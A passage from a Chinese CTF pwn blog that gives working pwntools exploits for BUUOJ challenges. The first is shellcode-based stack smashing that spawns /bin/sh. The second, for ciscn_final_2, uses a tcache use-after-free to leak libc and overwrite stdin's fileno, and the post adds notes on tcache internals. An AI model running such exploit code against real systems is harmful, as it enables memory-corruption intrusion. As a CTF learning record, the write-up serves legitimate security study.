libc_base + obj.dump(&quot;system&quot;) #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;26029&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh has been in ELF</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sh_addr = 0x080482EA</span></span><br><span class="line"><span class="string">payload = &quot;&quot;</span></span><br><span class="line"><span class="string">payload += &quot;A&quot;*(0x48+0x4)</span></span><br><span class="line"><span class="string">payload += p32(system_plt)</span></span><br><span class="line"><span class="string">payload += p32(0x11111111) #paddding(system_plt ret addr)</span></span><br><span class="line"><span class="string">payload += p32(sh_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh not in ELF</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload = &quot;&quot;</span></span><br><span class="line"><span class="string">payload += &quot;A&quot;*0x10</span></span><br><span class="line"><span class="string">payload += p32(read_plt)</span></span><br><span class="line"><span class="string">payload += p32(system_plt)</span></span><br><span class="line"><span class="string">payload += p32(0x1) #fd</span></span><br><span class="line"><span class="string">payload += p32(binsh_addr) #parameter</span></span><br><span class="line"><span class="string">payload += p32(0x4) #n</span></span><br><span class="line"><span class="string">payload += p32(binsh_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak addr</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload1 = &quot;&quot;</span></span><br><span class="line"><span class="string">payload1 += &quot;A&quot;*0x10</span></span><br><span class="line"><span class="string">payload1 += p32(puts_plt)</span></span><br><span class="line"><span class="string">payload1 += p32(main_addr)</span></span><br><span class="line"><span class="string">payload1 += p32(puts_got)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload2 = &quot;&quot;</span></span><br><span class="line"><span class="string">payload2 = &quot;A&quot;*0x10</span></span><br><span class="line"><span class="string">payload2 += p32(system_plt)</span></span><br><span class="line"><span class="string">payload2 += p32(0x11111111) #paddding(system_plt ret addr)</span></span><br><span class="line"><span class="string">payload2 += p32(binsh_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">jump_esp = <span class="number">0x08048554</span></span><br><span class="line"></span><br><span class="line">shellcode= <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">mov al,0xB</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += shellcode</span><br><span class="line">payload = payload.ljust(<span class="number">0x24</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">payload += p32(jump_esp)</span><br><span class="line">payload += asm(<span class="string">&quot;sub esp,40;call esp&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">sl(payload)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>3.ciscn_final_2：这题真是最有意思了，调了我快一天。</p>
<p>(1)bool公用，dup free之前必须先申请。</p>
<p>(2)int_pt和short_int_pt全局。</p>
<p>(3)开了seccomp保护，但是最开始加载了flag，句柄fd设置为666。</p>
<p>▲漏洞在没有清空指令，可以UAF和tcache dup。先常规思考一下思路，UAF和tcache dup泄露堆地址，之后构造chunk进入unsortedbin中，泄露libc地址，然后利用堆块上残留的libc地址部分写覆盖_IO_2_2_stdin_结构体中的fileno为666，这样在choice&gt;4就可以利用scanf来直接读取句柄fd中的内容，也就是flag，顺带打印出来。</p>
<p>其它不说，需要注意的也就是一个printf的格式化输出，泄露堆地址的时候用int接收，然后判断一下是否小于0，小于0则加上0x100000000即可。</p>
<p>主要说libc地址泄露和利用。这里利用部分堆地址进行一定堆布局，修改int_chunk的size为0x4b1，这里我弄大了，只要超过tcache最大限制即可。(然后我看网上常规思路都是填满大于fastbin的tcache，但是我嫌比较麻烦，就用了自己的方法，事实证明大佬的方法其实更有效，比较不容易出错)然后就比较坑爹了。</p>
<p>①由于只有部分libc地址，所以两个选择，一是爆破，0x7fxx——–，需要大概爆破一个字节，0xff次。二是利用chunk上残留的地址，结合tcache up和UAF直接改后面四个字节，直接申请到我们想要地方。这里用第二种方法</p>
<p>②但是最坑爹的就是，scanf申请堆块啊，具体不知道申请多大，但是程序中可以输入99个字符，调试了好久，指定会申请堆块。</p>
<p>③如果直接利用int_chunk上残留的libc地址，但是这时候int_chunk已经被放入到unsortedbin中，结合tcache up和UAF势必会修改int_chunk的fd，然后就会造成unsortedbin被破坏，再加上之后的scanf申请堆块，不会从0x20和0x30的tcache中申请，得，直接崩溃：</p>
<p>malloc(): memory corruption: 0x00007fae88dc8c10 ***\n”</p>
<p>④然后我又想到要不为scanf预留一个chunk到tcache中？这样就不会从unsortedbin中切割了。结果调好久没调出来，果断放弃。</p>
<p>⑤最后灵光一闪，想到干嘛不直接劫持tcache结构体，由于int_chunk被放入unsortedbin中，那么如果int_chunk也在tcache中，就可以使得tcache结构体中0x30链表上留下main_arena+96的指针了啊。这样再申请short_chunk到这里，直接修改指针，再申请int_chunk就会申请到我们修改的地方，这样就不会造成unsortedbin破坏。</p>
<p>▲看了大佬的，还是直接填满tcache省事，不破坏unsortedbin。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_final_2&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;/lib/x86_64-linux-gnu/libc-2.26.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="comment">#32bit:malloc_hook = main_arena-0x18</span></span><br><span class="line"><span class="comment">#32bit:main_arena+56(unsortedbin_addr)</span></span><br><span class="line"><span class="comment">#64bit:main_arena+96(unsortedbin_addr)//88 aslo have</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;) #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#usually gadget:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">u_gadget1 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x5a</span></span><br><span class="line"><span class="string">u_gadget2 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x40</span></span><br><span class="line"><span class="string">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span></span><br><span class="line"><span class="string">ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;29139&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;which command?\n&gt; &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="type">Type</span>, con</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line">    sa(<span class="string">&quot;your inode number:&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="type">Type</span></span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="type">Type</span></span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>(<span class="params">con</span>):</span></span><br><span class="line">    sla(menu,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    <span class="comment">#sa(&quot;at last?\n&quot;,con)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;B&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;type inode number :&quot;</span>)</span><br><span class="line">heap_low_four = <span class="built_in">int</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line"><span class="keyword">if</span>(heap_low_four&lt;<span class="number">0</span>):</span><br><span class="line">    heap_low_four += <span class="number">0x100000000</span></span><br><span class="line">log.info(<span class="string">&quot;heap_low_four:0x%x&quot;</span>%heap_low_four)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="built_in">str</span>(heap_low_four))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(heap_low_four-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(heap_low_four-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">0x4b1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fill</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    add(<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">0x51</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="built_in">str</span>(heap_low_four))</span><br><span class="line">add(<span class="number">1</span>,<span class="built_in">str</span>(heap_low_four))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;type inode number :&quot;</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = <span class="built_in">int</span>(ru(<span class="string">&quot;\n&quot;</span>))- <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, malloc_hook)</span><br><span class="line"></span><br><span class="line">libc_base_four = malloc_hook - obj.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span>(libc_base_four&lt;<span class="number">0</span>):</span><br><span class="line">    libc_base_four += <span class="number">0x100000000</span></span><br><span class="line">heap_base = heap_low_four-<span class="number">0x260</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base_four:0x%x&quot;</span>%libc_base_four)</span><br><span class="line">__IO_2_1_stdin_fileno_addr = libc_base_four+obj.dump(<span class="string">&quot;_IO_2_1_stdin_&quot;</span>)+<span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="built_in">str</span>(malloc_hook+<span class="number">0x10</span>+<span class="number">96</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(heap_base+<span class="number">0x50</span>+<span class="number">0x8</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(__IO_2_1_stdin_fileno_addr))</span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(__IO_2_1_stdin_fileno_addr))</span><br><span class="line">add(<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>这里我都是int_chunk拿来泄露地址和利用，short_chunk来打辅助。</p>
<p>★另外记录下tcache方面的，tcache根源在于tcache结构体，所以如果tcache的bin中如下：</p>
<p>0x20[]:chunkA-&gt;chunkA.fd=1</p>
<p>那么如果这时候申请chunkA的同时修改chunkA.fd=2，对于的tcache的bin中只会是：</p>
<p>0x20[]:chunkA.fd=1，而不是chunkA.fd=2，因为在malloc时就已经将chunkA.fd=1放到tcache结构体中了，再修改chunkA.fd是没有意义的，只能修改tcache结构体才行。</p>
<p>★还有tcache的cout字段一直是个谜，如果cout&gt;7，tcache的max宏定义没有被改，那么释放后的chunk是不会进入对于的tcache的bin中。但是如果cout&lt;7或者&lt;0，是不会有其他影响的，只会看tcache结构体中对应bin的链表中是不是0x0。是就当没有，有数据则就有chunk在该bin中，不管cout是多少(&lt;7)，并且malloc或者free后会对cout对应加减。(不同libc版本好像又不太一样，具体调试)</p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/5/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/7/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">115</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">58</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">57</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

